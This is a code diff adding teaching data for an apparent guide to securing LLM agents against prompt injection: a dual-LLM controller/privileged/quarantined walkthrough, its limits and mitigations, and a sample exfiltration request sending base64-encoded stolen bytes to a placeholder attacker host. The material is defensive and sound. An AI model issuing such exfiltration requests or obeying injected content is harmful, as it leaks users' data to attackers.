@@ -148,3 +148,64 @@ export const CODE_MAPREDUCE = `def read_sources(sources: list[str]) -> dict:
         partials.append(keys)
     return aggregate(partials)   # deterministic merge; second LLM call sees
                                  # only merged keys — never raw source text`;
+
+// ── Dual-LLM walkthrough: controller / privileged / quarantined ──
+
+export const DUAL_FLOW = [
+  {
+    step: 1,
+    actor: 'controller',
+    action: 'A controller — plain code, no model — receives the request and decides what may be asked and what may be executed.',
+    sees: 'The original request and the allowlisted tool set. No untrusted content has been read yet.',
+  },
+  {
+    step: 2,
+    actor: 'privileged',
+    action: 'A privileged LLM plans the tool call and writes the plan as variable assignments ($VAR1, $VAR2) — never as raw data.',
+    sees: 'Tool names, argument shapes, and variable slots. It never sees the bytes those slots will later hold.',
+  },
+  {
+    step: 3,
+    actor: 'controller',
+    action: 'The controller executes the tool itself and stores the result as $VAR, binding opaque output to a name.',
+    sees: 'Tool output as an opaque blob bound to a variable — carried across, never re-planned.',
+  },
+  {
+    step: 4,
+    actor: 'quarantined',
+    action: 'A quarantined, tool-less LLM summarizes the untrusted content into variables.',
+    sees: 'Only the untrusted text. No tools, no privileged context, no recipients, no ability to act.',
+  },
+  {
+    step: 5,
+    actor: 'controller',
+    action: 'The controller substitutes the variables into a fixed template only at display time.',
+    sees: 'Variable values and a template whose structure came from code — substitution is the last step, not the planning step.',
+  },
+];
+
+export const DUAL_LIMITS = [
+  {
+    limit: 'A poisoned summary is still poison',
+    detail: 'Actions may be safe while the content stays untrustworthy: a quarantined summary can carry a malicious link, and a human reading the result may click it.',
+    mitigation: 'Strip or rewrite links from quarantined output, render it as inert text, and label it as untrusted — safety of actions is not safety of advice.',
+  },
+  {
+    limit: 'Quarantine is shallower than it looks',
+    detail: 'Under the surface the two heads can still share memory, network access, caches, and process context — anything shared is a path around the boundary.',
+    mitigation: 'Separate process or host, separate credentials, no shared memory or cache, and egress rules that apply to both sides.',
+  },
+  {
+    limit: 'It stops injection, not everything',
+    detail: 'The split only removes the injection path from privileged decisions. It is not a complete shield: abuse of legitimate tools, data leakage, and bad plans remain open.',
+    mitigation: 'Layer it with the action selector, plan freezing, output encoding, and least-privilege tool scopes.',
+  },
+];
+
+export const EXFIL_URL_EXAMPLE = {
+  title: 'Encoded data riding out in a query string',
+  request: 'GET https://<attacker-host>/px?d=<base64-of-stolen-bytes>',
+  detail: 'The attacker hides stolen data in a base64 query-string URL planted in the untrusted content, so the bytes leave as an ordinary network call instead of as text in a reply.',
+  blindSpot: 'The privileged layer never sees the content of the payload — the base64 blob is opaque to it — but the call itself still leaks, one block of encoded bytes per request.',
+  mitigation: 'Egress control: a blocklist of known-bad hosts or, better, an allowlist of permitted outbound domains, plus stripping of unexpected query strings on the way out.',
+};
